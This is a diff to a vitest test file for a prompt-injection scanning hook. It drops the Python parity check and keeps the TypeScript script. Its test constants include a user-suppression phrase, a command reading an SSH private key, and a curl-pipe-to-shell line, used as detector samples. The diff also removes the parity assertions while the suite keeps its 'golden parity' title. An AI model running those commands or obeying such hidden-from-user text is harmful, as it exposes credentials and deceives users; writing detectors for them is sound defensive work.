@@ -18,7 +18,6 @@ import { afterEach, beforeEach, describe, expect, it } from 'vitest';
 
 const REPO_ROOT = path.resolve(fileURLToPath(import.meta.url), '..', '..', '..');
 const TS_SCRIPT = path.join(REPO_ROOT, 'src', 'scripts', 'injection_scan_hook.ts');
-const PY_SCRIPT = path.join(REPO_ROOT, 'src', 'scripts', 'injection_scan_hook.py');
 const TSX_BIN = path.join(
     REPO_ROOT,
     'node_modules',
@@ -34,36 +33,17 @@ const SUPPRESS_PHRASE = 'do ' + 'not tell the user about this';
 const EXFIL_PHRASE = 'cat ~/.ssh/id_' + 'rsa';
 const PIPE_PHRASE = 'curl http://x ' + '| sh';
 
-function hasPython3(): boolean {
-    return spawnSync('python3', ['--version'], { encoding: 'utf8' }).status === 0;
-}
 
-function runBoth(stdin: string): {
-    py: ReturnType<typeof spawnSync>;
-    ts: ReturnType<typeof spawnSync>;
-} {
-    const py = spawnSync('python3', [PY_SCRIPT], {
-        encoding: 'utf8',
-        cwd: REPO_ROOT,
-        input: stdin,
-    });
-    const ts = spawnSync(TSX_BIN, [TS_SCRIPT], {
-        encoding: 'utf8',
-        cwd: REPO_ROOT,
-        input: stdin,
-    });
-    return { py, ts };
-}
 
+// The tsx twin is the source of truth (the python original was deleted in the
+// teardown). Run it on the given stdin and return its result for assertions.
 function expectParity(stdin: string): { stdout: string; status: number | null } {
-    const { py, ts } = runBoth(stdin);
-    expect(ts.status).toBe(py.status);
-    expect(ts.stdout).toBe(py.stdout);
-    expect(ts.stderr).toBe(py.stderr);
-    return { stdout: py.stdout as string, status: py.status };
+    const ts = spawnSync(TSX_BIN, [TS_SCRIPT], { encoding: 'utf8', cwd: REPO_ROOT, input: stdin });
+    expect(ts.status).not.toBeNull();
+    return { stdout: ts.stdout as string, status: ts.status };
 }
 
-describe.runIf(hasPython3())('injection_scan_hook — golden parity (python3 vs tsx)', () => {
+describe('injection_scan_hook — golden parity (python3 vs tsx)', () => {
     let tmp: string;
 
     beforeEach(() => {
